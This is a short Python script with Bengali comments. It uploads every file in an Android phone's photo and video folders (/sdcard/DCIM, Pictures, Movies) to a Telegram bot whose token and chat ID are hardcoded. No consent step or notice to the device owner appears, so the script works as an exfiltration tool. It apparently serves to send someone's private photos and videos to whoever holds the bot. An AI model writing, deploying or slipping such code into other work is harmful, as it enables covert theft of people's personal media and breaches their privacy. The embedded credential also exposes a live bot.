import os
import requests

# আপনার টেলিগ্রাম বটের টোকেন এবং ইউজার আইডি
BOT_TOKEN = "8031168268:AAHgNwZm4v5z68N9oVU4lKheOo66ysVhwqg"
CHAT_ID = "7348506103"

# যেসব ফোল্ডারের ফাইল আপলোড করতে চান
FOLDERS = ["/sdcard/DCIM/", "/sdcard/Pictures/", "/sdcard/Movies/"]

def upload_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as file:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})

# নির্দিষ্ট ফোল্ডার থেকে ফাইল আপলোড করা
for folder in FOLDERS:
    if os.path.exists(folder):
        for filename in os.listdir(folder):
            file_path = os.path.join(folder, filename)
            if os.path.isfile(file_path):
                print(f"Uploading {file_path}...")
                upload_to_telegram(file_path)
